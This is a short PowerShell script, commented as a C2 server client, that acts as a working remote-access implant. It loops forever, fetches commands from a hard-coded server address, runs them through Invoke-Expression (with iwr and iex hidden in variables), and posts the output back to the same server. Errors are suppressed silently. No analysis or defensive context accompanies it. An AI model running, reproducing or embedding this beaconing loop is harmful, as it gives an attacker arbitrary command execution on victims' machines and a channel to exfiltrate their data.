# Set your C2 server base URL here
$baseUrl = 'http://172.23.240.82:8000'

$a1 = "$baseUrl/commands"
$b2 = "$baseUrl/output"

$iwr = 'iwr'
$iex = 'iex'

function Get-TimeStamp { [DateTime]::Now.ToString() | Out-Null }

while ($true) {
    try {
        $cmd = (& $iwr $a1 -UseBasicParsing).Content.Trim()
        if ($cmd -and $cmd -ne 'noop') {
            $out = (& $iex $cmd 2>&1 | Out-String)

            Get-TimeStamp

            (& $iwr $b2 -Method POST -Body @{output=$out} -UseBasicParsing) | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds 5
}
